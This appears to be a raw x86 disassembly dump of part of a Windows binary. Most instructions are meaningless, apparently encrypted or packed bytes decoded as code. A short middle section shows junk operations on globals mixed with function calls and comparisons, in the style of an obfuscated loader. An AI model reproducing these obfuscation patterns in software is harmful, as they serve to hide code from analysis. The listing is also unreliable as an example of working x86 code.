  40a7a2:	inc    edi
  40a7a3:	in     al,dx
  40a7a4:	or     eax,0x995d2f42
  40a7a9:	pop    ebx
  40a7aa:	sbb    DWORD PTR [ebp-0x51],esi
  40a7ad:	and    eax,0x449c1609
  40a7b2:	dec    ebx
  40a7b3:	and    dl,BYTE PTR [ebx]
  40a7b5:	mov    ch,0xc7
  40a7b7:	or     al,0x1a
  40a7b9:	cwde   
  40a7ba:	or     eax,0xfc14665d
  40a7bf:	sub    DWORD PTR [ebx],0xffffffcc
  40a7c2:	dec    ebx
  40a7c3:	inc    ebp
  40a7c4:	std    
  40a7c5:	imul   DWORD PTR [edx-0x56]
  40a7c8:	push   eax
  40a7c9:	fidivr DWORD PTR [ebx-0x32]
  40a7cc:	popf   
  40a7cd:	cmc    
  40a7ce:	jmp    0x94e4:0xdb2441b2
  40a7d5:	fwait
  40a7d6:	jne    0x40a815
  40a7d8:	mov    cl,0xbe
  40a7da:	mov    edi,0xd26005ba
  40a7df:	jp     0x40a77d
  40a7e1:	cmp    eax,0xc14caac
  40a7e6:	mov    bh,0xe1
  40a7e8:	mov    ax,0x18be
  40a7ec:	popa   
  40a7ed:	out    dx,eax
  40a7ee:	idiv   BYTE PTR [ecx+0x30]
  40a7f1:	sub    al,0xa4
  40a7f3:	push   ds
  40a7f4:	inc    ebx
  40a7f5:	and    al,0xfa
  40a7f7:	popf   
  40a7f8:	cld    
  40a7f9:	mov    bl,0x48
  40a7fb:	sub    DWORD PTR [edi+eiz*4],0xffffff99
  40a7ff:	xor    BYTE PTR gs:[esi+0x67d94ad2],dl
  40a806:	loopne 0x40a81f
  40a808:	leave  
  40a809:	popf   
  40a80a:	js     0x40a7bc
  40a80c:	ret    0xc05e
  40a80f:	hlt    
  40a810:	mov    dh,0x4c
  40a812:	or     eax,DWORD PTR [ecx]
  40a814:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a815:	cdq    
  40a816:	(bad)  
  40a817:	sub    cl,ch
  40a819:	jecxz  0x40a7cb
  40a81b:	ss mov ecx,0x8a62a234
  40a821:	repz mov eax,ds:0x8af0674f
  40a827:	pop    edi
  40a828:	push   ebx
  40a829:	and    edx,DWORD PTR [edx]
  40a82b:	std    
  40a82c:	pop    ss
  40a82d:	add    al,0x17
  40a82f:	test   BYTE PTR [ecx],0xf0
  40a832:	shl    edx,0x6f
  40a835:	pop    ss
  40a836:	repz adc esi,DWORD PTR [edx+edi*1]
  40a83a:	sbb    eax,0xa1dcd96
  40a83f:	push   cs
  40a840:	in     eax,0x7
  40a842:	push   edi
  40a843:	mov    ch,0xbc
  40a845:	enter  0xa53e,0xf6
  40a849:	outs   dx,DWORD PTR ds:[esi]
  40a84a:	imul   ecx,DWORD PTR [ecx-0x7d88bdc5],0x4140cbcf
  40a854:	add    DWORD PTR [edx],eax
  40a856:	inc    ebx
  40a857:	int3   
  40a858:	popf   
  40a859:	sbb    eax,DWORD PTR [ebp+0x1a]
  40a85c:	shl    BYTE PTR [ebx-0x19],1
  40a85f:	and    cl,BYTE PTR [edi+0x31]
  40a862:	test   BYTE PTR [ebx-0xad2cea7],dl
  40a868:	jb     0x40a88c
  40a86a:	mov    bl,0x4d
  40a86c:	push   esi
  40a86d:	loop   0x40a848
  40a86f:	cmp    al,0xd1
  40a871:	sti    
  40a872:	shr    BYTE PTR [ecx-0x288229e2],cl
  40a878:	jbe    0x40a848
  40a87a:	in     eax,dx
  40a87b:	cmc    
  40a87c:	in     al,dx
  40a87d:	xchg   esp,eax
  40a87e:	mov    cl,0x9b
  40a880:	std    
  40a881:	out    dx,eax
  40a882:	mov    al,ds:0x17d1ad6
  40a887:	shl    ecx,cl
  40a889:	ss es call 0x7c85:0x23196255
  40a892:	data16 je 0x40a818
  40a895:	xchg   BYTE PTR [ecx],dh
  40a897:	popf   
  40a898:	ins    BYTE PTR es:[edi],dx
  40a899:	cmp    al,0x4b
  40a89b:	xlat   BYTE PTR ds:[ebx]
  40a89c:	stos   BYTE PTR es:[edi],al
  40a89d:	sub    al,0x1e
  40a89f:	popf   
  40a8a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8a1:	fadd   QWORD PTR [ecx+ebp*8-0x60c9baff]
  40a8a8:	fldenv [ebp-0x3c]
  40a8ab:	ins    BYTE PTR es:[edi],dx
  40a8ac:	imul   edi,DWORD PTR [ecx-0x64],0xffffffd7
  40a8b0:	and    al,0x2f
  40a8b2:	adc    al,0x44
  40a8b4:	xchg   BYTE PTR [edi+0x496878d],al
  40a8ba:	popa   
  40a8bb:	test   eax,0xb83b1c67
  40a8c0:	pop    edi
  40a8c1:	js     0x40a8df
  40a8c3:	ficom  DWORD PTR [ebp+0x197acd8]
  40a8c9:	daa    
  40a8ca:	inc    edi
  40a8cb:	cmp    ah,ch
  40a8cd:	out    0x4d,al
  40a8cf:	mov    ah,0xdf
  40a8d1:	cmp    al,0x3
  40a8d3:	call   0x2649:0x7e8f7ee
  40a8da:	mov    al,ds:0xeb8c2e54
  40a8df:	dec    ebx
  40a8e0:	sbb    DWORD PTR [ecx],edi
  40a8e2:	bound  eax,QWORD PTR [ebx+0x81057ce]
  40a8e8:	sbb    ebx,DWORD PTR [ecx+ebx*1+0x30]
  40a8ec:	mul    DWORD PTR [ebx+ecx*2-0x7d108ff0]
  40a8f3:	jbe    0x40a931
  40a8f5:	mov    DWORD PTR [edi+0x5a17ca17],0xe0c3a88f
  40a8ff:	sub    eax,edi
  40a901:	xor    BYTE PTR [ebp+0x1075c792],0x8c
  40a908:	rcr    DWORD PTR [bp+di+0x44],cl
  40a90c:	inc    ebx
  40a90d:	sbb    cl,al
  40a90f:	and    bh,bl
  40a911:	push   ss
  40a912:	test   DWORD PTR [eax-0x54692a52],esi
  40a918:	and    BYTE PTR [edi+0x2a175f18],dh
  40a91e:	mov    esi,0xf7cd9607
  40a923:	inc    ebx
  40a924:	je     0x40a991
  40a926:	(bad)  
  40a927:	dec    edi
  40a928:	jge    0x40a939
  40a92a:	les    ebp,FWORD PTR [edi+0x7f]
  40a92d:	outs   dx,BYTE PTR ds:[esi]
  40a92e:	idiv   BYTE PTR [edx-0x52afbcdc]
  40a934:	fst    DWORD PTR cs:[edx-0x7b0eca3f]
  40a93b:	push   0xffffffbd
  40a93d:	xchg   ecx,eax
  40a93e:	and    ebx,DWORD PTR [ebx+0x3e]
  40a941:	mov    WORD PTR [ecx+0x68],?
  40a944:	sub    ebx,DWORD PTR [eax-0x5e1f4faa]
  40a94a:	sahf   
  40a94b:	jbe    0x40a967
  40a94d:	fst    st(6)
  40a94f:	mov    ecx,0xbd8a0d67
  40a954:	jecxz  0x40a90e
  40a956:	je     0x40a955
  40a958:	cli    
  40a959:	inc    edi
  40a95a:	pop    ecx
  40a95b:	je     0x40a99c
  40a95d:	xor    dl,cl
  40a95f:	aas    
  40a960:	out    dx,al
  40a961:	add    DWORD PTR [edi+0x71817ae3],ebx
  40a967:	sub    DWORD PTR [edi],esp
  40a969:	scas   al,BYTE PTR es:[edi]
  40a96a:	dec    ebp
  40a96b:	xor    al,0xb8
  40a96d:	mov    ebp,0x28253ecc
  40a972:	daa    
  40a973:	fstp   QWORD PTR [edx]
  40a975:	mov    gs,WORD PTR [esi+ecx*2+0x40]
  40a979:	rol    dl,cl
  40a97b:	mov    ecx,0x7dba4b2
  40a980:	mov    ebx,0x8b4b5451
  40a985:	int3   
  40a986:	cmp    eax,DWORD PTR [edx-0x1a]
  40a989:	cli    
  40a98a:	jb     0x40a9b2
  40a98c:	xchg   edx,eax
  40a98d:	retf   0x8c00
  40a990:	jl     0x40a9a2
  40a992:	jnp    0x40a972
  40a994:	scas   eax,DWORD PTR es:[edi]
  40a995:	retf   
  40a996:	jno    0x40a9a6
  40a998:	sahf   
  40a999:	cwde   
  40a99a:	sbb    DWORD PTR [eax+0x2df4b830],ebp
  40a9a0:	aaa    
  40a9a1:	out    dx,eax
  40a9a2:	hlt    
  40a9a3:	dec    eax
  40a9a4:	scas   al,BYTE PTR es:[edi]
  40a9a5:	ficom  DWORD PTR ds:0x57edcf1e
  40a9ab:	push   0x71
  40a9ad:	push   ds
  40a9ae:	stos   BYTE PTR es:[edi],al
  40a9af:	dec    esp
  40a9b0:	repz or eax,0x295cbad4
  40a9b6:	call   0xcb39:0x2bc1e898
  40a9bd:	dec    ebx
  40a9be:	xchg   ecx,eax
  40a9bf:	mov    WORD PTR [eax-0x7b],es
  40a9c2:	call   FWORD PTR [edi+0x3ddc228b]
  40a9c8:	add    eax,DWORD PTR [ecx+0x1]
  40a9cb:	jg     0x40a957
  40a9cd:	cmp    al,0xee
  40a9cf:	xchg   ebp,eax
  40a9d0:	adc    al,0x8a
  40a9d2:	(bad)
  40a9d5:	fwait
  40a9d6:	cld    
  40a9d7:	fwait
  40a9d8:	xchg   esp,eax
  40a9d9:	cld    
  40a9da:	jge    0x40a9f0
  40a9dc:	into   
  40a9dd:	int3   
  40a9de:	out    0xe,al
  40a9e0:	jecxz  0x40a985
  40a9e2:	dec    ebp
  40a9e3:	xchg   edi,eax
  40a9e4:	cs cmp al,0xde
  40a9e7:	sbb    al,0x3d
  40a9e9:	data16 mov al,0x17
  40a9ec:	adc    al,0x80
  40a9ee:	xchg   esp,eax
  40a9ef:	push   0xffffff80
  40a9f1:	imul   esp,DWORD PTR [ebp-0x7c614d2d],0x56c8b70c
  40a9fb:	sub    ah,bl
  40a9fd:	xchg   edx,eax
  40a9fe:	adc    edx,ebp
  40aa00:	mov    al,ds:0x5456cddb
  40aa05:	xchg   ebp,eax
  40aa06:	movhlps xmm7,xmm1
  40aa09:	inc    esp
  40aa0a:	xchg   esi,eax
  40aa0b:	inc    edx
  40aa0c:	jo     0x40aa7e
  40aa0e:	inc    eax
  40aa0f:	loop   0x40aa41
  40aa11:	ja     0x40aa8a
  40aa13:	(bad)  
  40aa14:	cmc    
  40aa15:	add    eax,0xdc354e2a
  40aa1a:	jp     0x40a9ff
  40aa1c:	xchg   edi,eax
  40aa1d:	pop    ecx
  40aa1e:	rcr    DWORD PTR [esi-0xe],1
  40aa21:	loope  0x40aa57
  40aa23:	scas   eax,DWORD PTR es:[edi]
  40aa24:	adc    eax,0x13c42721
  40aa29:	retf   0x42da
  40aa2c:	sahf   
  40aa2d:	xlat   BYTE PTR ds:[ebx]
  40aa2e:	aam    0x1e
  40aa30:	pushf  
  40aa31:	hlt    
  40aa32:	stc    
  40aa33:	xor    al,0xca
  40aa35:	jge    0x40aa1e
  40aa37:	xchg   esi,eax
  40aa38:	sub    edi,DWORD PTR [esp+ebx*4+0x16ff89c5]
  40aa3f:	cmp    al,BYTE PTR [edi]
  40aa41:	retf   0x591f
  40aa44:	test   BYTE PTR [edx+0x1e],0xa8
  40aa48:	xchg   edi,eax
  40aa49:	adc    edx,DWORD PTR [esi-0x54]
  40aa4c:	loopne 0x40aa64
  40aa4e:	sub    bl,BYTE PTR [ecx]
  40aa50:	sbb    ebp,DWORD PTR [ecx-0x27]
  40aa53:	call   0x1836a4d1
  40aa58:	das    
  40aa59:	mov    BYTE PTR [ebp+0x4e9ab58],cl
  40aa5f:	lahf   
  40aa60:	imul   DWORD PTR [ebx-0x289d0fa2]
  40aa66:	jb     0x40aa3b
  40aa68:	xchg   ebx,eax
  40aa69:	dec    ebp
  40aa6a:	stos   BYTE PTR es:[edi],al
  40aa6b:	jle    0x40aad8
  40aa6d:	aas    
  40aa6e:	push   cs
  40aa6f:	adc    DWORD PTR ds:0x156c5f6a,ebp
  40aa75:	fcmove st,st(1)
  40aa77:	and    DWORD PTR [edi],eax
  40aa79:	data16 fild DWORD PTR [ebx-0x4a]
  40aa7e:	jecxz  0x40aa22
  40aa80:	inc    edi
  40aa81:	inc    ebx
  40aa82:	nop
  40aa83:	mov    edi,DWORD PTR [eax-0x573bc90f]
  40aa89:	xchg   DWORD PTR [edx-0x7b],eax
  40aa8c:	hlt    
  40aa8d:	sbb    BYTE PTR [edx+0x26],al
  40aa90:	test   eax,0x2b789ebe
  40aa95:	mov    ebx,esi
  40aa97:	mov    WORD PTR [edx*1+0x15684419],fs
  40aa9e:	add    BYTE PTR ds:0x969f79cd,dh
  40aaa4:	or     dl,BYTE PTR [eax-0x3e74a337]
  40aaaa:	jecxz  0x40aa7d
  40aaac:	dec    ecx
  40aaad:	leave  
  40aaae:	jl     0x40aa48
  40aab0:	add    eax,0xd9df347e
  40aab5:	loop   0x40aa51
  40aab7:	add    edi,0x3f
  40aaba:	ds loop 0x40aadd
  40aabd:	gs int3 
  40aabf:	adc    al,0x87
  40aac1:	pop    esi
  40aac2:	(bad)  
  40aac3:	scas   eax,DWORD PTR es:[edi]
  40aac4:	mul    DWORD PTR [ecx]
  40aac6:	push   0x3cf4b748
  40aacb:	in     eax,0xbc
  40aacd:	inc    eax
  40aace:	sbb    DWORD PTR [eax+0x53d96c6b],esi
  40aad4:	repz aaa 
  40aad6:	push   ss
  40aad7:	and    eax,DWORD PTR [edx-0x18a1f87d]
  40aadd:	(bad)  
  40aade:	and    dh,BYTE PTR [ecx+ebp*2+0xde6c26c]
  40aae5:	push   ebp
  40aae6:	fs repz pop ebp
  40aae9:	scas   eax,DWORD PTR es:[edi]
  40aaea:	push   0x51e7bc30
  40aaef:	out    0xac,al
  40aaf1:	pop    es
  40aaf2:	or     ecx,DWORD PTR [edi+edx*2-0x4f]
  40aaf6:	daa    
  40aaf7:	lods   eax,DWORD PTR ds:[esi]
  40aaf8:	sbb    ah,dl
  40aafa:	mov    ?,WORD PTR [edx+eax*8-0x1d]
  40aafe:	fdivr  st(4),st
  40ab00:	outs   dx,DWORD PTR ds:[esi]
  40ab01:	shl    BYTE PTR [ebx-0x6891f77c],1
  40ab07:	or     BYTE PTR [ebp-0x16c7b221],0xf2
  40ab0e:	aas    
  40ab0f:	in     al,dx
  40ab10:	mov    dh,0xa6
  40ab12:	fnsave [eax+0x9]
  40ab15:	pushf  
  40ab16:	cld    
  40ab17:	out    dx,al
  40ab18:	not    DWORD PTR [edx+0x78afb608]
  40ab1e:	shl    DWORD PTR ds:0xf8d36873,0x52
  40ab25:	inc    edi
  40ab26:	and    eax,0x3bd56343
  40ab2b:	mov    ecx,0x583898ff
  40ab30:	ja     0x40aba7
  40ab32:	fdivr  st(0),st
  40ab34:	xchg   ecx,eax
  40ab35:	dec    esi
  40ab36:	shr    BYTE PTR [ecx-0x5f],1
  40ab39:	fidivr WORD PTR [edi]
  40ab3b:	fwait
  40ab3c:	outs   dx,DWORD PTR ds:[esi]
  40ab3d:	sub    edi,eax
  40ab3f:	call   0xa2e6:0x5c7ce33
  40ab46:	inc    edx
  40ab47:	add    BYTE PTR [edx+eax*1+0x0],dl
  40ab4b:	add    BYTE PTR [ebx],bh
  40ab4d:	enter  0x840f,0xbd
  40ab51:	and    eax,0x458b0000
  40ab56:	cld    
  40ab57:	and    DWORD PTR ds:0x42a28a,0x5384
  40ab61:	xor    eax,esi
  40ab63:	add    DWORD PTR ds:0x42a2fa,0x7b59
  40ab6d:	add    eax,edi
  40ab6f:	cmp    ebx,eax
  40ab71:	mov    DWORD PTR ds:0x42a2e6,0x2910
  40ab7b:	jne    0x40d0af
  40ab81:	xor    DWORD PTR ds:0x42a276,0x42a2d6
  40ab8b:	push   DWORD PTR [ebp+0x8]
  40ab8e:	call   0x4250c1
  40ab93:	and    DWORD PTR ds:0x42a266,edi
  40ab99:	mov    DWORD PTR [ebp-0x14],eax
  40ab9c:	xor    ecx,ecx
  40ab9e:	xor    ecx,DWORD PTR ds:0x42a306
  40aba4:	mov    eax,ds:0x42a3a2
  40aba9:	sub    ecx,eax
  40abab:	or     ecx,DWORD PTR [ecx+eax*1]
  40abae:	mov    eax,DWORD PTR [ebp-0x4]
  40abb1:	sbb    ecx,0x17a4
  40abb7:	mov    ecx,DWORD PTR [ebp-0x14]
  40abba:	xor    DWORD PTR ds:0x42a28a,0x42a2a6
  40abc4:	xor    eax,esi
  40abc6:	add    eax,edi
  40abc8:	mov    DWORD PTR ds:0x42a25a,0x307a
  40abd2:	cmp    ecx,eax
  40abd4:	mov    DWORD PTR ds:0x42a2be,0xd4
  40abde:	je     0x40d1cc
  40abe4:	or     DWORD PTR ds:0x42a2c6,0x42a266
  40abee:	push   DWORD PTR [ebp-0x14]
  40abf1:	not    DWORD PTR ds:0x42a2a6
  40abf7:	push   DWORD PTR [ebp+0x8]
  40abfa:	sbb    DWORD PTR ds:0x42a2ae,0x3b6a
  40ac04:	call   0x425181
  40ac09:	mov    DWORD PTR [ebp-0x14],eax
  40ac0c:	or     eax,DWORD PTR ds:0x42a2be
  40ac12:	mov    eax,DWORD PTR [ebp-0x4]
  40ac15:	mov    ecx,DWORD PTR [ebp-0x14]
  40ac18:	xor    eax,esi
  40ac1a:	and    DWORD PTR ds:0x42a2da,0x42a2fe
  40ac24:	add    eax,edi
  40ac26:	cmp    ecx,eax
  40ac28:	mov    DWORD PTR ds:0x42a2d6,0x7d26
  40ac32:	je     0x40d1cc
  40ac38:	xor    ecx,DWORD PTR ds:0x42a2ea
  40ac3e:	mov    eax,DWORD PTR [ebp-0x14]
  40ac41:	mov    eax,DWORD PTR [eax+0x18]
  40ac44:	or     DWORD PTR ds:0x42a29a,0x5e55
  40ac4e:	mov    DWORD PTR [ebp-0x24],eax
  40ac51:	xor    DWORD PTR ds:0x42a2be,ecx
  40ac57:	mov    eax,DWORD PTR [ebp-0x14]
  40ac5a:	and    DWORD PTR ds:0x42a2ee,0x0
  40ac64:	mov    ecx,DWORD PTR ds:0x42a2ee
  40ac6a:	inc    ecx
  40ac6b:	mov    DWORD PTR ds:0x42a2ee,ecx
  40ac71:	cmp    DWORD PTR ds:0x42a2ee,0x1f
  40ac78:	jb     0x40acb0
  40ac7e:	jmp    0x40aca3
  40ac83:	push   DWORD PTR [ebp-0x28]
  40ac86:	push   0x6caa
  40ac8b:	push   0x1820
  40ac90:	push   0x670f
  40ac95:	push   0x3854
  40ac9a:	push   DWORD PTR [ebp-0x24]
  40ac9d:	call   DWORD PTR ds:0x42a3c2
  40aca3:	cmp    DWORD PTR ds:0x42a2ee,0x14
  40acaa:	jb     0x40ac64
  40acb0:	mov    ecx,DWORD PTR [ebp+0x8]
  40acb3:	add    ecx,DWORD PTR [eax+0x20]
  40acb6:	movzx  eax,BYTE PTR ds:0x42a2e6
  40acbd:	adc    DWORD PTR ds:0x42a286,eax
  40acc3:	mov    DWORD PTR [ebp-0x2c],ecx
  40acc6:	adc    DWORD PTR ds:0x42a2b6,ecx
  40accc:	mov    eax,DWORD PTR [ebp-0x14]
  40accf:	sbb    ecx,DWORD PTR ds:0x42a262
  40acd5:	jmp    0x40d063
  40acda:	test   BYTE PTR fs:[esi],bl
  40acdd:	pop    es
  40acde:	sahf   
  40acdf:	and    DWORD PTR [edx-0x80],0x235b4cfa
  40ace6:	xlat   BYTE PTR ds:[ebx]
  40ace7:	inc    ebp
  40ace8:	xor    ecx,DWORD PTR [edx]
  40acea:	pop    eax
  40aceb:	lock add DWORD PTR [ebx-0x7c7ca1f4],0x0
  40acf3:	(bad)  
  40acf4:	icebp  
  40acf5:	sbb    eax,0xde59c72d
  40acfa:	pop    edi
  40acfb:	pusha  
  40acfc:	jae    0x40acc6
  40acfe:	jmp    0x40ad6b
  40ad00:	dec    ebp
  40ad01:	pop    ebp
  40ad02:	cwde   
  40ad03:	pop    ecx
  40ad04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad05:	(bad)  
  40ad06:	das    
  40ad07:	paddw  mm5,mm1
  40ad0a:	add    eax,0xd63880a8
  40ad0f:	jne    0x40acfe
  40ad11:	jge    0x40ac99
  40ad13:	mov    ds,esi
  40ad15:	int    0x69
  40ad17:	stc    
  40ad18:	jno    0x40ad09
  40ad1a:	lods   eax,DWORD PTR ds:[esi]
  40ad1b:	nop
  40ad1c:	sti    
  40ad1d:	inc    edi
  40ad1e:	mov    ebx,0xd03cf672
  40ad23:	mov    ebp,ebx
  40ad25:	into   
  40ad26:	mov    esi,0xa282c4c8
  40ad2b:	sbb    BYTE PTR [ecx-0x46ae318a],bl
  40ad31:	mov    ch,0xf5
  40ad33:	aam    0xaa
  40ad35:	mov    edi,DWORD PTR [esi+0x2b8deadb]
  40ad3b:	mov    dh,0x77
  40ad3d:	addr16 inc esi
  40ad3f:	mov    al,0x11
  40ad41:	and    ebp,DWORD PTR [ebp-0x23]
  40ad44:	sbb    al,0x41
  40ad46:	mov    edi,0xe5a881d9
  40ad4b:	fnstcw WORD PTR [esi+0x25]
  40ad4e:	and    cl,BYTE PTR [ebx+0x50606dc7]
  40ad54:	stc    
  40ad55:	adc    al,0x23
  40ad57:	xor    cl,BYTE PTR [eax+0x41405464]
  40ad5d:	ret    
  40ad5e:	cdq    
  40ad5f:	lock shl BYTE PTR [eax],0x47
  40ad63:	jp     0x40ad3a
  40ad65:	and    edx,DWORD PTR [edx+0x42]
  40ad68:	sbb    al,0x64
  40ad6a:	leave  
  40ad6b:	fs inc eax
  40ad6d:	int3   
  40ad6e:	out    dx,eax
  40ad6f:	sbb    dh,ch
  40ad71:	fist   WORD PTR [ebx+eiz*2]
  40ad74:	lahf   
  40ad75:	sub    DWORD PTR [esi+0x4b],ecx
  40ad78:	addr16 imul esp,ebx,0xffffffc4
  40ad7c:	sar    BYTE PTR [ebx+0xbe2eace],0x4d
  40ad83:	call   0x883b:0x66468da8
  40ad8a:	mov    WORD PTR [edi+ebp*8],?
  40ad8d:	lahf   
  40ad8e:	inc    eax
  40ad90:	div    DWORD PTR [ecx]
  40ad92:	lods   eax,DWORD PTR ds:[esi]
  40ad93:	fwait
  40ad94:	sub    al,0xf7
  40ad96:	call   0xb20a89c1
  40ad9b:	push   0x21
  40ad9d:	jnp    0x40ad25
  40ad9f:	and    DWORD PTR [edx],edx
  40ada1:	mov    al,0xfb
  40ada3:	pop    eax
  40ada4:	shl    ah,cl
  40ada6:	mov    DWORD PTR [ecx+0x5b5b6aa9],esp
  40adac:	sbb    cl,BYTE PTR [ecx]
  40adae:	push   ds
  40adaf:	xor    DWORD PTR [ebp+0x19],edx
  40adb2:	xor    DWORD PTR [ecx+0x3ca8d07d],ecx
  40adb8:	retf   0x7218
  40adbb:	sub    ch,BYTE PTR [ebp-0x28]
  40adbe:	jmp    0x40ae21
  40adc0:	and    DWORD PTR [esi+0x17],esp
  40adc3:	scas   eax,DWORD PTR es:[edi]
  40adc4:	nop
  40adc5:	cmp    cl,ch
  40adc7:	push   cs
  40adc8:	(bad)  
  40adc9:	ins    DWORD PTR es:[edi],dx
  40adca:	lds    ecx,FWORD PTR [esi+0x64931402]
  40add0:	cld    
  40add1:	push   edi
  40add2:	and    ecx,ebx
  40add4:	jle    0x40adbc
  40add6:	lods   al,BYTE PTR ds:[esi]
  40add7:	pop    es
  40add8:	aaa    
  40add9:	push   esp
  40adda:	mov    BYTE PTR [ecx-0x16],al
  40addd:	lods   al,BYTE PTR ds:[esi]
  40adde:	jmp    0x40ad60
  40ade0:	adc    al,0x1
  40ade2:	adc    bl,BYTE PTR cs:[edi]
  40ade5:	in     al,dx
  40ade6:	rcl    BYTE PTR ds:0x9e6edd06,0xe4
  40aded:	adc    ebx,DWORD PTR [ebx-0x72ddabba]
  40adf3:	scas   eax,DWORD PTR es:[edi]
  40adf4:	outs   dx,DWORD PTR ds:[esi]
  40adf5:	push   ss
  40adf6:	loopne 0x40ada7
  40adf8:	sbb    al,0x31
  40adfa:	sub    edx,DWORD PTR [esi]
  40adfc:	mov    edx,0x7ddad7e8
  40ae01:	repz rcl dl,0xed
  40ae05:	(bad)  
  40ae06:	test   ebx,0x9d89f290
  40ae0c:	stc    
  40ae0d:	call   esp
  40ae0f:	xchg   ebx,eax
  40ae10:	mov    dh,0x9e
  40ae12:	mov    ds:0xcfadb06e,eax
  40ae17:	jb     0x40ad9e
  40ae19:	and    bh,BYTE PTR [ecx-0x41]
  40ae1c:	sub    DWORD PTR [esi-0x29],ebp
  40ae1f:	mov    eax,ds:0x983cc037
  40ae24:	push   ebp
  40ae25:	fwait
  40ae26:	loope  0x40ae23
  40ae28:	jns    0x40add8
  40ae2a:	add    bh,ch
  40ae2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae2d:	out    dx,eax
  40ae2e:	stc    
  40ae2f:	cli    
  40ae30:	std    
  40ae31:	pop    esp
  40ae32:	sub    eax,0xcf118f41
  40ae37:	inc    edx
  40ae38:	popa   
  40ae39:	cmp    ebp,eax
  40ae3b:	fld    TBYTE PTR [edx]
  40ae3d:	rcl    dh,cl
  40ae3f:	xor    eax,0xffffffd9
  40ae42:	(bad)  
  40ae43:	or     bh,BYTE PTR [ecx+ebx*8+0x58]
  40ae47:	fs pushf 
  40ae49:	xchg   esp,eax
  40ae4a:	adc    BYTE PTR [ecx],dh
  40ae4c:	pop    ss
  40ae4d:	fisub  WORD PTR [ebx-0x59]
  40ae50:	out    0xc3,al
  40ae52:	fist   WORD PTR [esp+edi*2-0x31]
  40ae56:	jl     0x40aebe
  40ae58:	pop    edx
  40ae59:	fadd   DWORD PTR [ebp-0x11358b8d]
  40ae5f:	bound  ecx,QWORD PTR [ecx+0x511c4556]
  40ae65:	shr    DWORD PTR [ebp-0x44a40003],0x7c
  40ae6c:	stos   DWORD PTR es:[edi],eax
  40ae6d:	jecxz  0x40aeb2
  40ae6f:	add    DWORD PTR [ebp-0x4b37eb94],ecx
  40ae75:	(bad)  
  40ae76:	bound  esi,QWORD PTR [ebp+ebp*1+0x4f]
  40ae7a:	fmul   QWORD PTR [ebx]
  40ae7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae7d:	jge    0x40ae8b
  40ae7f:	bound  eax,QWORD PTR [ecx+0x2a]
  40ae82:	adc    dl,BYTE PTR [edi-0x779fbe1]
  40ae88:	fiadd  DWORD PTR ds:0xc62c4f6f
  40ae8e:	retf   
  40ae8f:	push   edi
  40ae90:	into   
  40ae91:	repz xor BYTE PTR [esi+ecx*8-0x577dbbf8],ch
  40ae99:	jecxz  0x40af02
  40ae9b:	or     bh,dl
  40ae9d:	dec    ebp
  40ae9e:	(bad)  
  40ae9f:	out    dx,al
  40aea0:	ins    BYTE PTR es:[edi],dx
  40aea1:	jb     0x40aeac
  40aea3:	and    edx,DWORD PTR [esi+0x7a6d593e]
  40aea9:	sub    al,0x52
  40aeab:	lods   eax,DWORD PTR ds:[esi]
  40aeac:	fnop   
  40aeae:	les    edx,FWORD PTR [edi+0x441addd5]
  40aeb4:	aam    0x8c
  40aeb6:	in     eax,0xaf
  40aeb8:	mov    edi,0x65a765d6
  40aebd:	outs   dx,DWORD PTR ds:[esi]
  40aebe:	dec    esi
  40aebf:	mov    ch,0xd7
  40aec1:	iret   
  40aec2:	aam    0x10
  40aec4:	or     dl,bh
  40aec6:	ret    0xda8b
  40aec9:	es xchg edi,eax
  40aecb:	bound  esp,QWORD PTR [esi-0xf]
  40aece:	push   ebp
  40aecf:	outs   dx,DWORD PTR ds:[esi]
  40aed0:	mov    cl,0x28
  40aed2:	sti    
  40aed3:	scas   al,BYTE PTR es:[edi]
  40aed4:	out    dx,eax
  40aed5:	pop    ss
  40aed6:	fdiv   DWORD PTR [esi-0x65]
  40aed9:	jbe    0x40af45
  40aedb:	dec    esp
  40aedc:	fld    QWORD PTR [ecx-0x2a]
  40aedf:	jo     0x40af37
  40aee1:	push   edx
  40aee2:	es xchg esp,eax
  40aee4:	push   esp
  40aee5:	int    0x10
  40aee7:	inc    DWORD PTR [eax]
  40aee9:	or     eax,0xdd2eafb9
  40aeee:	(bad)  
  40aeef:	xchg   ebp,eax
  40aef0:	lods   al,BYTE PTR ds:[esi]
  40aef1:	dec    BYTE PTR [edi]
  40aef3:	daa    
  40aef4:	cli    
  40aef5:	mov    DWORD PTR [ecx+edx*4],edi
  40aef8:	lods   al,BYTE PTR ds:[esi]
  40aef9:	inc    ecx
  40aefa:	and    al,0xf6
  40aefc:	sti    
  40aefd:	inc    BYTE PTR [edi]
  40aeff:	dec    ecx
  40af00:	adc    ch,ah
  40af02:	in     al,dx
  40af03:	mov    dl,0x17
  40af05:	adc    dh,BYTE PTR [edx-0x8]
  40af08:	lahf   
  40af09:	mov    bh,bh
  40af0b:	lsl    eax,WORD PTR cs:[ebx]
  40af0f:	hlt    
  40af10:	pop    ecx
  40af11:	and    BYTE PTR ds:0x84d0faf3,bl
  40af17:	cld    
  40af18:	mov    esi,DWORD PTR [edi+ecx*2]
  40af1b:	stos   DWORD PTR es:[edi],eax
  40af1c:	xor    dh,BYTE PTR [esi]
  40af1e:	and    al,0x9
  40af20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af21:	scas   eax,DWORD PTR es:[edi]
  40af22:	sub    DWORD PTR [esi-0x58690e16],0xffffffce
  40af29:	ds mov eax,ds
  40af2c:	imul   esp,DWORD PTR ds:0x7fa9a456,0xffffffcb
  40af33:	inc    ecx
  40af34:	and    BYTE PTR [edx+ecx*1],ch
  40af37:	out    0xed,al
  40af39:	je     0x40af2d
  40af3b:	pop    esp
  40af3c:	stos   BYTE PTR es:[edi],al
  40af3d:	mov    ecx,DWORD PTR ds:0x3918dcb1
  40af43:	sbb    ebx,esi
  40af45:	pop    ebp
  40af46:	loop   0x40af10
  40af48:	fwait
  40af49:	push   eax
  40af4a:	push   ecx
  40af4b:	and    esi,DWORD PTR [edx-0x5e]
  40af4e:	sbb    BYTE PTR [ebp+0x5d],bl
  40af51:	jo     0x40af11
  40af53:	push   0xd7347869
  40af58:	pop    ebp
  40af59:	retf   
  40af5a:	ins    DWORD PTR es:[edi],dx
  40af5b:	adc    DWORD PTR [esi+0x15],edi
  40af5e:	inc    ebx
  40af5f:	push   esi
